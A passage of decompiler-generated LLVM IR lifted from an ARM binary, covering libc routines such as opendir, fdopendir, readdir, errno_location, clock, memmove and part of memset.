  %v0_11598 = load i32, i32* %r3.global-to-local, align 4
  %v2_11598 = add i32 %v0_11574, 16
  %v3_11598 = inttoptr i32 %v2_11598 to i32*
  store i32 %v0_11598, i32* %v3_11598, align 4
  %v0_1159c = load i32, i32* %r3.global-to-local, align 4
  %v2_1159c = add i32 %v0_11574, 8
  %v3_1159c = inttoptr i32 %v2_1159c to i32*
  store i32 %v0_1159c, i32* %v3_1159c, align 4
  br i1 %v2_11590, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_1158c
  %v0_115a42 = load i32, i32* @r4, align 4
  %v2_115a43 = add i32 %v0_11574, 20
  %v3_115a44 = inttoptr i32 %v2_115a43 to i32*
  store i32 %v0_115a42, i32* %v3_115a44, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_1158c
  %v1_115a0 = load i32, i32* %r3.global-to-local, align 4
  %v2_115a0 = add i32 %v1_115a0, 512
  store i32 %v2_115a0, i32* %r3.global-to-local, align 4
  %v0_115a4 = load i32, i32* @r4, align 4
  %v2_115a4 = add i32 %v0_11574, 20
  %v3_115a4 = inttoptr i32 %v2_115a4 to i32*
  store i32 %v0_115a4, i32* %v3_115a4, align 4
  %v1_115a8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_115a8, i32* %v3_115a4, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v0_11574, i32* @r5, align 4
  %v0_115b0 = load i32, i32* @r7, align 4
  %v2_115b0 = inttoptr i32 %v0_11574 to i32*
  store i32 %v0_115b0, i32* %v2_115b0, align 4
  %v0_115b4 = load i32, i32* @r5, align 4
  %v1_115b4 = add i32 %v0_115b4, 20
  %v2_115b4 = inttoptr i32 %v1_115b4 to i32*
  %v3_115b4 = load i32, i32* %v2_115b4, align 4
  store i32 %v3_115b4, i32* %r1.global-to-local, align 4
  %v2_115bc = call i32 @calloc(i32 1, i32 %v3_115b4)
  %v2_115c0 = icmp eq i32 %v2_115bc, 0
  store i32 %v2_115bc, i32* @r4, align 4
  %v1_115c8 = load i32, i32* @r5, align 4
  %v2_115c8 = add i32 %v1_115c8, 12
  %v3_115c8 = inttoptr i32 %v2_115c8 to i32*
  store i32 %v2_115bc, i32* %v3_115c8, align 4
  br i1 %v2_115c0, label %dec_label_pc_115d0, label %dec_label_pc_115e0

dec_label_pc_115d0:                               ; preds = %bb17
  %v0_115d0 = load i32, i32* @r5, align 4
  store i32 %v0_115d0, i32* @r0, align 4
  %v0_115d4 = call i32 @free()
  %v0_115d8 = load i32, i32* @r4, align 4
  br label %dec_label_pc_11618

dec_label_pc_115e0:                               ; preds = %bb17
  %v0_115e4 = load i32, i32* @r6, align 4
  %v2_115e4 = add i32 %v0_115e4, -34484
  store i32 %v2_115e4, i32* %r3.global-to-local, align 4
  %v1_115ec = inttoptr i32 %v2_115e4 to i32*
  %v2_115ec = load i32, i32* %v1_115ec, align 4
  %v3_115ec = add i32 %v0_115e4, -34480
  %v4_115ec = inttoptr i32 %v3_115ec to i32*
  %v5_115ec = load i32, i32* %v4_115ec, align 4
  store i32 %v5_115ec, i32* %r1.global-to-local, align 4
  %v6_115ec = add i32 %v0_115e4, -34476
  %v7_115ec = inttoptr i32 %v6_115ec to i32*
  %v8_115ec = load i32, i32* %v7_115ec, align 4
  store i32 %v8_115ec, i32* %r2.global-to-local, align 4
  %v9_115ec = add i32 %v0_115e4, -34472
  %v10_115ec = inttoptr i32 %v9_115ec to i32*
  %v11_115ec = load i32, i32* %v10_115ec, align 4
  store i32 %v11_115ec, i32* %r3.global-to-local, align 4
  %v12_115ec = add i32 %v0_115e4, -34468
  %v1_115f8 = inttoptr i32 %v12_115ec to i32*
  %v2_115f8 = load i32, i32* %v1_115f8, align 4
  %v3_115f8 = add i32 %v0_115e4, -34464
  %v4_115f8 = inttoptr i32 %v3_115f8 to i32*
  %v5_115f8 = load i32, i32* %v4_115f8, align 4
  store i32 %v2_115f8, i32* %stack_var_-32, align 4
  store i32 %v5_115ec, i32* %r1.global-to-local, align 4
  store i32 %v8_115ec, i32* %r2.global-to-local, align 4
  store i32 %v11_115ec, i32* %r3.global-to-local, align 4
  %v0_11608 = load i32, i32* @r5, align 4
  %v1_11608 = add i32 %v0_11608, 24
  %v1_1160c = inttoptr i32 %v1_11608 to i32*
  store i32 %v2_115ec, i32* %v1_1160c, align 4
  %v3_1160c = add i32 %v0_11608, 28
  %v4_1160c = inttoptr i32 %v3_1160c to i32*
  %v5_1160c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1160c, i32* %v4_1160c, align 4
  %v6_1160c = add i32 %v0_11608, 32
  %v7_1160c = inttoptr i32 %v6_1160c to i32*
  %v8_1160c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1160c, i32* %v7_1160c, align 4
  %v9_1160c = add i32 %v0_11608, 36
  %v10_1160c = inttoptr i32 %v9_1160c to i32*
  %v11_1160c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_1160c, i32* %v10_1160c, align 4
  %v12_1160c = add i32 %v0_11608, 40
  %v2_11610 = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_115f8, i32* %r1.global-to-local, align 4
  %v1_11614 = inttoptr i32 %v12_1160c to i32*
  store i32 %v2_11610, i32* %v1_11614, align 4
  %v3_11614 = add i32 %v0_11608, 44
  %v4_11614 = inttoptr i32 %v3_11614 to i32*
  %v5_11614 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_11614, i32* %v4_11614, align 4
  %v0_11618.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11618

dec_label_pc_11618:                               ; preds = %bb, %dec_label_pc_115d0, %dec_label_pc_115e0
  %v0_11618 = phi i32 [ 0, %bb ], [ %v0_115d8, %dec_label_pc_115d0 ], [ %v0_11618.pre, %dec_label_pc_115e0 ]
  store i32 %v3_11560, i32* @r4, align 4
  store i32 %v6_11560, i32* @r5, align 4
  store i32 %v9_11560, i32* @r6, align 4
  store i32 %v12_11560, i32* @r7, align 4
  ret i32 %v0_11618

; uselistorder directives
  uselistorder i32 %v2_115bc, { 1, 0, 2 }
  uselistorder i32 %v0_11574, { 2, 1, 6, 0, 5, 4, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_11618, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  %v3_11630 = load i32, i32* @r7, align 4
  store i32 542720, i32* %r1.global-to-local, align 4
  %v2_11638 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp6 = icmp ult i32 %arg1, -4095
  br i1 %tmp6, label %dec_label_pc_11668, label %dec_label_pc_11650

dec_label_pc_11650:                               ; preds = %entry
  %v0_11654 = call i32 @__aeabi_read_tp()
  %v3_11658 = load i16, i16* @global_var_22068.345, align 2
  %v4_11658 = sext i16 %v3_11658 to i32
  %v0_1165c = load i32, i32* %r2.global-to-local, align 4
  %v1_1165c = sub i32 0, %v0_1165c
  store i32 %v1_1165c, i32* %r2.global-to-local, align 4
  %v3_11660 = add i32 %v4_11658, %v0_11654
  %v4_11660 = inttoptr i32 %v3_11660 to i32*
  store i32 %v1_1165c, i32* %v4_11660, align 4
  br label %dec_label_pc_1168c

dec_label_pc_11668:                               ; preds = %entry
  store i32 %arg1, i32* @r7, align 4
  %v1_11668 = icmp slt i32 %arg1, 0
  br i1 %v1_11668, label %dec_label_pc_1168c, label %dec_label_pc_11670

dec_label_pc_11670:                               ; preds = %dec_label_pc_11668
  store i32 %v2_11638, i32* @r1, align 4
  %v0_11674 = call i32 @fstat()
  %v1_11678 = icmp slt i32 %v0_11674, 0
  br i1 %v1_11678, label %dec_label_pc_11680, label %dec_label_pc_11694

dec_label_pc_11680:                               ; preds = %dec_label_pc_11670
  br label %dec_label_pc_1168c

dec_label_pc_1168c:                               ; preds = %dec_label_pc_11680, %dec_label_pc_11668, %dec_label_pc_11650
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_116d8

dec_label_pc_11694:                               ; preds = %dec_label_pc_11670
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_1169c = load i32, i32* @r7, align 4
  %v3_116a0 = call i32 @__GI___fcntl_nocancel(i32 %v0_1169c, i32 2, i32 1)
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_116a8 = load i32, i32* @r7, align 4
  %v2_116ac = call i32 @fd_to_DIR(i32 %v0_116a8, i32 %tmp)
  store i32 %v2_116ac, i32* %r1.global-to-local, align 4
  %v2_116b0 = icmp eq i32 %v2_116ac, 0
  br i1 %v2_116b0, label %dec_label_pc_116b8, label %dec_label_pc_116d8

dec_label_pc_116b8:                               ; preds = %dec_label_pc_11694
  %v0_116c8 = call i32 @__aeabi_read_tp()
  %v3_116cc = load i16, i16* @global_var_22068.345, align 2
  %v4_116cc = sext i16 %v3_116cc to i32
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_116d4 = add i32 %v4_116cc, %v0_116c8
  %v4_116d4 = inttoptr i32 %v3_116d4 to i32*
  store i32 12, i32* %v4_116d4, align 4
  %v0_116d8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_116d8

dec_label_pc_116d8:                               ; preds = %dec_label_pc_11694, %dec_label_pc_1168c, %dec_label_pc_116b8
  %v0_116d8 = phi i32 [ %v2_116ac, %dec_label_pc_11694 ], [ 0, %dec_label_pc_1168c ], [ %v0_116d8.pre, %dec_label_pc_116b8 ]
  store i32 %v3_11630, i32* @r7, align 4
  ret i32 %v0_116d8

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_116d8, { 2, 0, 1 }
}

define i32 @"$d.9"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_116e8:
  %v0_116e8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_116e8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_116e8
  %v1_116e8 = load i32, i32* @r8, align 4
  %v5_116ec = mul i32 %v1_116e8, 1048576
  %v6_116ec = and i32 %v5_116ec, %arg2
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_116e8, %bb
  %v4_116f0 = phi i32 [ %arg1, %dec_label_pc_116e8 ], [ %v6_116ec, %bb ]
  ret i32 %v4_116f0

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @fdopendir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_116f8 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_116f8, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_11704 = call i32 @fstat()
  store i32 %v0_11704, i32* @r5, align 4
  %v2_11708 = icmp eq i32 %v0_11704, 0
  br i1 %v2_11708, label %dec_label_pc_11710, label %dec_label_pc_11788

dec_label_pc_11710:                               ; preds = %entry
  %v1_11714 = and i32 %tmp4, 61440
  store i32 %v1_11714, i32* @r3, align 4
  %v7_11718 = icmp eq i32 %v1_11714, 16384
  br i1 %v7_11718, label %dec_label_pc_11738, label %dec_label_pc_11720

dec_label_pc_11720:                               ; preds = %dec_label_pc_11710
  %v0_11724 = call i32 @__aeabi_read_tp()
  %v3_11728 = load i16, i16* @global_var_22068.345, align 2
  %v0_1172c = load i32, i32* @r5, align 4
  store i32 %v0_1172c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1176c

dec_label_pc_11738:                               ; preds = %dec_label_pc_11710
  %v0_11738 = load i32, i32* @r4, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_11740 = call i32 @__libc_fcntl(i32 %v0_11738, i32 3)
  %v7_11744 = icmp eq i32 %v2_11740, -1
  br i1 %v7_11744, label %dec_label_pc_11788, label %dec_label_pc_1174c

dec_label_pc_1174c:                               ; preds = %dec_label_pc_11738
  %v1_1174c = urem i32 %v2_11740, 4
  store i32 %v1_1174c, i32* %r3.global-to-local, align 4
  %v7_11750 = icmp eq i32 %v1_1174c, 1
  br i1 %v7_11750, label %dec_label_pc_11758, label %dec_label_pc_11774

dec_label_pc_11758:                               ; preds = %dec_label_pc_1174c
  %v0_1175c = call i32 @__aeabi_read_tp()
  %v3_11760 = load i16, i16* @global_var_22068.345, align 2
  %v0_11764 = load i32, i32* @r5, align 4
  store i32 %v0_11764, i32* %r1.global-to-local, align 4
  %v0_11768 = load i32, i32* %r3.global-to-local, align 4
  %v1_11768 = add i32 %v0_11768, 21
  br label %dec_label_pc_1176c

dec_label_pc_1176c:                               ; preds = %dec_label_pc_11720, %dec_label_pc_11758
  %v2_1176c.in = phi i16 [ %v3_11728, %dec_label_pc_11720 ], [ %v3_11760, %dec_label_pc_11758 ]
  %v1_1176c = phi i32 [ %v0_11724, %dec_label_pc_11720 ], [ %v0_1175c, %dec_label_pc_11758 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_11720 ], [ %v1_11768, %dec_label_pc_11758 ]
  %v2_1176c = sext i16 %v2_1176c.in to i32
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v3_1176c = add i32 %v1_1176c, %v2_1176c
  %v4_1176c = inttoptr i32 %v3_1176c to i32*
  store i32 %storemerge, i32* %v4_1176c, align 4
  %v0_1178c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1178c

dec_label_pc_11774:                               ; preds = %dec_label_pc_1174c
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_11778 = load i32, i32* @r4, align 4
  %v2_1177c = call i32 @fd_to_DIR(i32 %v0_11778, i32 %tmp)
  store i32 %v2_1177c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1178c

dec_label_pc_11788:                               ; preds = %entry, %dec_label_pc_11738
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1178c

dec_label_pc_1178c:                               ; preds = %dec_label_pc_11774, %dec_label_pc_1176c, %dec_label_pc_11788
  %v0_1178c = phi i32 [ %v2_1177c, %dec_label_pc_11774 ], [ %v0_1178c.pre, %dec_label_pc_1176c ], [ 0, %dec_label_pc_11788 ]
  ret i32 %v0_1178c

; uselistorder directives
  uselistorder i32 %v1_1174c, { 1, 0 }
  uselistorder i32 %v2_11740, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 6, 4, 5, 7, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 21, { 5, 0, 6, 7, 4, 1, 8, 2, 9, 3, 10 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_1178c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11788, { 1, 0 }
  uselistorder label %dec_label_pc_1176c, { 1, 0 }
}

define i32 @__GI_readdir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_117a4 = load i32, i32* @r4, align 4
  %v6_117a4 = load i32, i32* @r5, align 4
  %v9_117a4 = load i32, i32* @r6, align 4
  %v12_117a4 = load i32, i32* @r7, align 4
  %v15_117a4 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* @r6, align 4
  %v1_117b8 = add i32 %tmp, 24
  store i32 %v1_117b8, i32* @r4, align 4
  %v4_117bc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 68) to i32*), align 4
  store i32 %v4_117bc, i32* %r1.global-to-local, align 4
  store i32 %v1_117b8, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_117d0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_117d0)
  %v0_117e4 = load i32, i32* @r6, align 4
  %v2_117e4 = add i32 %v0_117e4, 16
  %v3_117e4 = inttoptr i32 %v2_117e4 to i32*
  %v4_117e4 = load i32, i32* %v3_117e4, align 4
  store i32 %v4_117e4, i32* @ip, align 4
  store i32 71664, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_117e4)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_117f4

dec_label_pc_117f4:                               ; preds = %dec_label_pc_11824, %entry
  %v0_117f4 = load i32, i32* @r5, align 4
  %v1_117f4 = add i32 %v0_117f4, 4
  %v2_117f4 = inttoptr i32 %v1_117f4 to i32*
  %v3_117f4 = load i32, i32* %v2_117f4, align 4
  store i32 %v3_117f4, i32* %r2.global-to-local, align 4
  %v4_117f4 = add i32 %v0_117f4, 8
  %v5_117f4 = inttoptr i32 %v4_117f4 to i32*
  %v6_117f4 = load i32, i32* %v5_117f4, align 4
  %tmp10 = icmp ugt i32 %v6_117f4, %v3_117f4
  br i1 %tmp10, label %dec_label_pc_11824, label %dec_label_pc_11800

dec_label_pc_11800:                               ; preds = %dec_label_pc_117f4
  %v1_11800 = inttoptr i32 %v0_117f4 to i32*
  %v2_11800 = load i32, i32* %v1_11800, align 4
  %v1_11804 = add i32 %v0_117f4, 12
  %v2_11804 = inttoptr i32 %v1_11804 to i32*
  %v3_11804 = load i32, i32* %v2_11804, align 4
  store i32 %v3_11804, i32* %r1.global-to-local, align 4
  %v1_11808 = add i32 %v0_117f4, 20
  %v2_11808 = inttoptr i32 %v1_11808 to i32*
  %v3_11808 = load i32, i32* %v2_11808, align 4
  store i32 %v3_11808, i32* %r2.global-to-local, align 4
  %v4_1180c = call i32 @__getdents(i32 %v2_11800, i32 %v3_11804, i32 %v3_11808, i32 %v6_117f4)
  %tmp9 = icmp slt i32 %v4_1180c, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_1181c

.thread:                                          ; preds = %dec_label_pc_11800
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_11850

dec_label_pc_1181c:                               ; preds = %dec_label_pc_11800
  %v1_1181c = load i32, i32* @r5, align 4
  %v2_1181c = add i32 %v1_1181c, 8
  %v3_1181c = inttoptr i32 %v2_1181c to i32*
  store i32 %v4_1180c, i32* %v3_1181c, align 4
  %v0_11820 = load i32, i32* @r7, align 4
  %v1_11820 = load i32, i32* @r5, align 4
  %v2_11820 = add i32 %v1_11820, 4
  %v3_11820 = inttoptr i32 %v2_11820 to i32*
  store i32 %v0_11820, i32* %v3_11820, align 4
  %v0_11824.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11824

dec_label_pc_11824:                               ; preds = %dec_label_pc_117f4, %dec_label_pc_1181c
  %v1_11834 = phi i32 [ %v0_117f4, %dec_label_pc_117f4 ], [ %v0_11824.pre, %dec_label_pc_1181c ]
  %v1_11824 = add i32 %v1_11834, 4
  %v2_11824 = inttoptr i32 %v1_11824 to i32*
  %v3_11824 = load i32, i32* %v2_11824, align 4
  store i32 %v3_11824, i32* %r2.global-to-local, align 4
  %v1_11828 = add i32 %v1_11834, 12
  %v2_11828 = inttoptr i32 %v1_11828 to i32*
  %v3_11828 = load i32, i32* %v2_11828, align 4
  store i32 %v3_11828, i32* %r1.global-to-local, align 4
  %v2_1182c = add i32 %v3_11828, %v3_11824
  store i32 %v2_1182c, i32* @r4, align 4
  %v1_11830 = add i32 %v2_1182c, 4
  %v2_11830 = inttoptr i32 %v1_11830 to i32*
  %v3_11830 = load i32, i32* %v2_11830, align 4
  %v2_11834 = add i32 %v1_11834, 16
  %v3_11834 = inttoptr i32 %v2_11834 to i32*
  store i32 %v3_11830, i32* %v3_11834, align 4
  %v0_11838 = load i32, i32* @r4, align 4
  %v1_11838 = add i32 %v0_11838, 8
  %v2_11838 = inttoptr i32 %v1_11838 to i16*
  %v3_11838 = load i16, i16* %v2_11838, align 2
  %v4_11838 = zext i16 %v3_11838 to i32
  %v0_1183c = load i32, i32* %r2.global-to-local, align 4
  %v1_1183c = load i32, i32* %r1.global-to-local, align 4
  %v2_1183c = add i32 %v1_1183c, %v0_1183c
  %v3_1183c = inttoptr i32 %v2_1183c to i32*
  %v4_1183c = load i32, i32* %v3_1183c, align 4
  store i32 %v4_1183c, i32* %r1.global-to-local, align 4
  %v2_11840 = add i32 %v0_1183c, %v4_11838
  %v2_11844 = icmp eq i32 %v4_1183c, 0
  %v1_11848 = load i32, i32* @r5, align 4
  %v2_11848 = add i32 %v1_11848, 4
  %v3_11848 = inttoptr i32 %v2_11848 to i32*
  store i32 %v2_11840, i32* %v3_11848, align 4
  br i1 %v2_11844, label %dec_label_pc_117f4, label %dec_label_pc_11850

dec_label_pc_11850:                               ; preds = %dec_label_pc_11824, %.thread
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_1185c = load i32, i32* @r6, align 4
  %v2_1185c = add i32 %v0_1185c, 44
  %v3_1185c = inttoptr i32 %v2_1185c to i32*
  %v4_1185c = load i32, i32* %v3_1185c, align 4
  call void @__pseudo_branch(i32 %v4_1185c)
  %v0_11868 = load i32, i32* @r4, align 4
  store i32 %v3_117a4, i32* @r4, align 4
  store i32 %v6_117a4, i32* @r5, align 4
  store i32 %v9_117a4, i32* @r6, align 4
  store i32 %v12_117a4, i32* @r7, align 4
  store i32 %v15_117a4, i32* @lr, align 4
  ret i32 %v0_11868

; uselistorder directives
  uselistorder i32 %v1_11834, { 0, 2, 1 }
  uselistorder i32 %v6_117f4, { 1, 0 }
  uselistorder i32 %v0_117f4, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_11824, { 1, 0 }
}

define i32 @function_1187c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1187c:
  %v0_1187c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1187c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1187c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1187c, %bb
  %v4_11888 = phi i32 [ %arg1, %dec_label_pc_1187c ], [ 0, %bb ]
  ret i32 %v4_11888

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  %v0_1188c = load i32, i32* @lr, align 4
  %v0_11894 = call i32 @__aeabi_read_tp()
  %v3_11898 = load i16, i16* @global_var_22068.345, align 2
  %v4_11898 = sext i16 %v3_11898 to i32
  %v2_1189c = add i32 %v4_11898, %v0_11894
  store i32 %v0_1188c, i32* @lr, align 4
  ret i32 %v2_1189c
}

define i32 @clock(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_118b0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_118b0, i32* @r0, align 4
  %v1_118b8 = call i32 @times(i32 %v2_118b0)
  %v2_118bc = load i32, i32* %stack_var_-24, align 4
  %v2_118c0 = add i32 %v2_118bc, %tmp
  %v2_118c8 = mul i32 %v2_118c0, 10000
  %v1_118cc = and i32 %v2_118c8, 2147483632
  ret i32 %v1_118cc

; uselistorder directives
  uselistorder i32 %v2_118b0, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_118e0 = call i32 @_memcpy()
  ret i32 %v0_118e0
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_118f0 = call i32 @_memcpy()
  ret i32 %v0_118f0

; uselistorder directives
  uselistorder i32 ()* @_memcpy, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v8_11904 = icmp eq i32 %arg3, 8
  store i1 %v8_11904, i1* %cpsr_z.global-to-local, align 1
  %v5_11908 = icmp slt i32 %arg3, 8
  br i1 %v5_11908, label %dec_label_pc_11968, label %dec_label_pc_1190c

dec_label_pc_1190c:                               ; preds = %entry
  %v4_1190c = mul i32 %arg2, 256
  %v5_1190c = or i32 %v4_1190c, %arg2
  %v4_11910 = mul i32 %v5_1190c, 65536
  %v5_11910 = or i32 %v4_11910, %v5_1190c
  store i32 %v5_11910, i32* @r1, align 4
  %v1_1191457 = urem i32 %tmp, 4
  %v2_1191458 = icmp eq i32 %v1_1191457, 0
  store i1 %v2_1191458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_1191458, label %dec_label_pc_11924, label %bb

bb:                                               ; preds = %dec_label_pc_1190c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_1190c ]
  %v3_1191859 = phi i32 [ %v6_11918, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_1190c ]
  %v4_11918 = inttoptr i32 %v3_1191859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_11918, align 1
  %v5_11918 = load i32, i32* @r3, align 4
  %v6_11918 = add i32 %v5_11918, 1
  store i32 %v6_11918, i32* @r3, align 4
  %v0_1191c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_11928.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v0_1191c.pr, label %dec_label_pc_11924, label %.thread

.thread:                                          ; preds = %bb
  %v2_1191c = add i32 %v0_11928.pr.pre, -1
  store i32 %v2_1191c, i32* %r2.global-to-local, align 4
  %v1_11914 = urem i32 %v6_11918, 4
  %v2_11914 = icmp eq i32 %v1_11914, 0
  store i1 %v2_11914, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11914, label %dec_label_pc_11924, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_11918.pre = load i32, i32* @r1, align 4
  %extract.t82 = trunc i32 %v1_11918.pre to i8
  br label %bb

dec_label_pc_11924:                               ; preds = %.thread, %bb, %dec_label_pc_1190c
  %v0_1193028 = phi i32 [ %tmp, %dec_label_pc_1190c ], [ %v6_11918, %bb ], [ %v6_11918, %.thread ]
  %v0_11928.pr = phi i32 [ %arg3, %dec_label_pc_1190c ], [ %v0_11928.pr.pre, %bb ], [ %v2_1191c, %.thread ]
  %v0_11924 = load i32, i32* @r1, align 4
  store i32 %v0_11924, i32* %ip.global-to-local, align 4
  %v8_1192810 = icmp eq i32 %v0_11928.pr, 8
  store i1 %v8_1192810, i1* %cpsr_z.global-to-local, align 1
  %v5_1192c11 = icmp slt i32 %v0_11928.pr, 8
  br i1 %v5_1192c11, label %dec_label_pc_11968, label %dec_label_pc_11930.preheader

dec_label_pc_11930.preheader:                     ; preds = %dec_label_pc_11924
  %v1_1193046 = inttoptr i32 %v0_1193028 to i32*
  store i32 %v0_11924, i32* %v1_1193046, align 4
  %v3_1193047 = add i32 %v0_1193028, 4
  %v4_1193048 = inttoptr i32 %v3_1193047 to i32*
  %v5_1193049 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_1193049, i32* %v4_1193048, align 4
  %v6_1193050 = add i32 %v0_1193028, 8
  store i32 %v6_1193050, i32* @r3, align 4
  %v0_1193451 = load i32, i32* %r2.global-to-local, align 4
  %v1_1193452 = add i32 %v0_1193451, -8
  store i32 %v1_1193452, i32* %r2.global-to-local, align 4
  %v5_1193c53 = icmp slt i32 %v1_1193452, 8
  br i1 %v5_1193c53, label %dec_label_pc_11930.dec_label_pc_11968.loopexit_crit_edge, label %dec_label_pc_11940

dec_label_pc_11940:                               ; preds = %dec_label_pc_11930.preheader, %dec_label_pc_11928.dec_label_pc_11930_crit_edge
  %v6_1193055 = phi i32 [ %v6_11930, %dec_label_pc_11928.dec_label_pc_11930_crit_edge ], [ %v6_1193050, %dec_label_pc_11930.preheader ]
  %v0_1193054 = phi i32 [ %v12_1195c, %dec_label_pc_11928.dec_label_pc_11930_crit_edge ], [ %v0_1193028, %dec_label_pc_11930.preheader ]
  %v1_11940 = inttoptr i32 %v6_1193055 to i32*
  %v2_11940 = load i32, i32* @r1, align 4
  store i32 %v2_11940, i32* %v1_11940, align 4
  %v3_11940 = add i32 %v0_1193054, 12
  %v4_11940 = inttoptr i32 %v3_11940 to i32*
  %v5_11940 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11940, i32* %v4_11940, align 4
  %v6_11940 = add i32 %v0_1193054, 16
  store i32 %v6_11940, i32* @r3, align 4
  %v0_11944 = load i32, i32* %r2.global-to-local, align 4
  %v1_11944 = add i32 %v0_11944, -8
  store i32 %v1_11944, i32* %r2.global-to-local, align 4
  %v5_1194c = icmp slt i32 %v1_11944, 8
